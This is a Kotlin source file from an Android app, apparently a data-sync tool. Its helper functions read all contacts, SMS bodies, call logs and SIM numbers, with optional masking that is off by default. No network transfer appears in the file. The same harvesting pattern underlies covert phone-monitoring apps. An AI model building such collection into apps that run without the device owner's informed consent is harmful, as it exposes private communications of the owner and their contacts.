package com.boxx.datasync.utils

import android.annotation.SuppressLint
import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import com.boxx.datasync.domain.model.CallLog as CallLogModel
import com.boxx.datasync.domain.model.Contact
import com.boxx.datasync.domain.model.NotificationData
import com.boxx.datasync.domain.model.SMS
import com.boxx.datasync.utils.DataUtils.hashString

object DataHelper {

    @SuppressLint("Range")
    fun fetchContacts(context: Context, maskData: Boolean = false, sinceTimestamp: Long = 0): List<Contact> {
        val contacts = mutableListOf<Contact>()
        val selection = if (sinceTimestamp > 0) "${ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP} > ?" else null
        val selectionArgs = if (sinceTimestamp > 0) arrayOf(sinceTimestamp.toString()) else null

        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, selection, selectionArgs, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
                var phone = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "Unknown"

                if (maskData) {
                    phone = maskPhoneNumber(phone)
                }

                val id = hashString("$name$phone")
                contacts.add(Contact(id, name, phone, System.currentTimeMillis()))
            }
        }
        return contacts
    }

    @SuppressLint("Range")
    fun fetchSMS(context: Context, maskData: Boolean = false, sinceTimestamp: Long = 0): List<SMS> {
        val smsList = mutableListOf<SMS>()
        val selection = if (sinceTimestamp > 0) "${Telephony.Sms.DATE} > ?" else null
        val selectionArgs = if (sinceTimestamp > 0) arrayOf(sinceTimestamp.toString()) else null

        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, selection, selectionArgs, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                var address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: ""
                var body = it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))

                if (maskData) {
                    address = maskPhoneNumber(address)
                    body = redactMessageBody(body)
                }

                val id = hashString("$address$body$date")
                smsList.add(SMS(id, address, body, date, type))
            }
        }
        return smsList
    }

    @SuppressLint("Range")
    fun fetchCallLogs(context: Context, maskData: Boolean = false, sinceTimestamp: Long = 0): List<CallLogModel> {
        val callLogs = mutableListOf<CallLogModel>()
        val selection = if (sinceTimestamp > 0) "${CallLog.Calls.DATE} > ?" else null
        val selectionArgs = if (sinceTimestamp > 0) arrayOf(sinceTimestamp.toString()) else null

        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, selection, selectionArgs, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                var number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: ""
                val name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))

                if (maskData) {
                    number = maskPhoneNumber(number)
                }

                val id = hashString("$number$date$type")
                callLogs.add(CallLogModel(id, number, name, type, date, duration))
            }
        }
        return callLogs
    }

    fun maskPhoneNumber(phone: String): String {
        if (phone.length < 7) return "***"
        val firstPart = phone.take(3)
        val lastPart = phone.takeLast(3)
        return "$firstPart***$lastPart"
    }

    fun redactMessageBody(body: String): String {
        if (body.isBlank()) return ""
        val words = body.split(" ")
        if (words.size <= 2) return "[REDACTED]"
        return words.take(2).joinToString(" ") + "... [REDACTED]"
    }

    fun fetchNotifications(context: Context): List<NotificationData> {
        return emptyList()
    }

    @SuppressLint("MissingPermission")
    fun getSimState(context: Context): Map<String, Any> {
        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
        val result = mutableMapOf<String, Any>(
            "sim1Carrier" to "No SIM available",
            "sim2Carrier" to "No SIM available",
            "sim1Number" to "Number unavailable",
            "sim2Number" to "Number unavailable",
            "sim1Ready" to false,
            "sim2Ready" to false
        )

        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return result
        }

        try {
            val activeSubscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            if (!activeSubscriptionInfoList.isNullOrEmpty()) {
                for (subscriptionInfo in activeSubscriptionInfoList) {
                    val slotIndex = subscriptionInfo.simSlotIndex
                    val carrierName = subscriptionInfo.carrierName?.toString()?.takeIf { it.isNotBlank() } ?: "Unknown Carrier"
                    val number = subscriptionInfo.number?.takeIf { it.isNotBlank() } ?: "Number unavailable"

                    if (slotIndex == 0) {
                        result["sim1Carrier"] = carrierName
                        result["sim1Number"] = number
                        result["sim1Ready"] = true
                    } else if (slotIndex == 1) {
                        result["sim2Carrier"] = carrierName
                        result["sim2Number"] = number
                        result["sim2Ready"] = true
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("DataHelper", "Error getting SIM state", e)
        }

        // Ensure "No SIM available" fallback is handled if SIM was once ready but is no longer detected.
        if (!(result["sim1Ready"] as Boolean)) {
            result["sim1Carrier"] = "No SIM available"
            result["sim1Number"] = "Number unavailable"
        }
        if (!(result["sim2Ready"] as Boolean)) {
            result["sim2Carrier"] = "No SIM available"
            result["sim2Number"] = "Number unavailable"
        }

        android.util.Log.d("DataHelper", "SIM_STATE_UPDATED")
        return result
    }
}
